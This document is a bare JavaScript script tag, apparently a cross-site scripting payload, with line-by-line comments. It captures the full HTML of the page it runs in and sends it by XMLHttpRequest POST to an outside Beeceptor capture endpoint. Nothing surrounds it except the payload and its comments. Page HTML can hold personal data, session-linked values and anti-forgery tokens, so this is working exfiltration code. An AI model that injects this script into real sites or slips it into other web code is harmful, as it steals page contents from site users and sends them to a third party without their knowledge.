<script type="text/javascript">
	// Collect the HTML content of the current tab
	var htmlContent = document.documentElement.innerHTML;

	// Create a new XMLHttpRequest object
	var xhr = new XMLHttpRequest();

	// Define the endpoint URL for the Beeceptor endpoint or other remote server
	var endpointUrl = "https://geetika.free.beeceptor.com";

	// Open a new POST request to the endpoint URL
	xhr.open("POST", endpointUrl);

	// Set the request headers to send JSON data
	xhr.setRequestHeader("Content-Type", "application/json");

	// Send the HTML content as JSON data in the request body
	xhr.send(JSON.stringify({ htmlContent: htmlContent }));
</script>
